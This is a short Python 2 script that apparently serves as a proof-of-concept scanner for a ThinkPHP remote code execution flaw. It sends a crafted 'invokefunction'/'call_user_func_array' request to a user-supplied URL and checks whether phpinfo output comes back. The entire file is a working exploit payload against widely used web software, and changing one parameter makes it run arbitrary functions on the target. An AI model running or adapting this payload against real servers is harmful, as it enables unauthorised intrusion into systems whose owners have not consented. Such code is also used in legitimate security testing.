# /usr/bin/env python
# -*- coding:utf-8 -*-

import sys

reload(sys)
sys.setdefaultencoding('utf-8')

import requests
from bs4 import BeautifulSoup

def run(url):
    payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    target_url = url + payload
    try:
        response = requests.get(url=target_url)
        soup = BeautifulSoup(response.text,"lxml")
        if 'PHP Version' in str(soup.text):
            print '[+] Remote code execution vulnerability exists at the target address'
            print '[+] Vulnerability url address ' + target_url
        else:
            print '[-] There is no remote code execution vulnerability in the target address'
    except:
        print '[!] Destination address cannot be connected'

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print '[-] Usage: ' + str(sys.argv[0]) + ' -u http://www.targeturl.com'
        print '[!] Error: argument -u/--url is required'
    else:
        target_url = sys.argv[2]
        run(target_url)
